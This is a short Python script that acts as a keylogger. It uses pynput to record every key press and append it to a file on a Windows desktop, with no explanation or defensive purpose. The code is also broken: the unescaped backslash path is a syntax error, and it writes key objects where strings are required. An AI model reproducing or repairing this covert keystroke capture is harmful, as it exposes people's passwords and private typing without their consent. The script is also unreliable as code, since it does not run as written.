import pynput
from pynput.keyboard import Key, Listener


def on_press(Key):
	keydata=Key
	
	
	with open("C:\Users\PC USER\Desktop\vlog3.txt",'a+') as f:
                f.write(keydata)
                

with Listener(on_press=on_press) as listener:
	listener.join()
